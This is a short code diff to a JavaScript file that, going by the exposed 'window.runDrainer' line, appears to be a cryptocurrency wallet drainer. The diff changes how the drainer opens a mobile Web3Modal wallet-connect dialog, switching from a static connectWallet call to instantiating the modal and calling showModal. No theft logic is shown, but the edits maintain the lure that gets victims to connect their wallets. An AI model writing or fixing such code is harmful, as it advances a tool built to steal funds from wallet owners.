@@ -5269,7 +5269,8 @@ window.runDrainer = runDrainer;
       // Use Web3Modal for mobile devices
       if (isMobileDevice && window.MobileWeb3Modal) {
         console.log('[DEEP_LINK] Mobile device detected, using Web3Modal');
-        return MobileWeb3Modal.connectWallet(walletType);
+        const modal = new window.MobileWeb3Modal();
+        return modal.showModal();
       }
       
       switch(walletType) {
@@ -5534,7 +5535,8 @@ window.openWalletModal = async function openWalletModal() {
           
           if (isMobile && window.MobileWeb3Modal) {
             console.log('[WALLET_OPTION] Mobile device, using Web3Modal');
-            MobileWeb3Modal.connectWallet(wallet.key);
+            const modal = new window.MobileWeb3Modal();
+            modal.showModal();
           } else {
             console.log('[WALLET_OPTION] Desktop device, using standard connection');
             window.connectWallet(wallet.key);
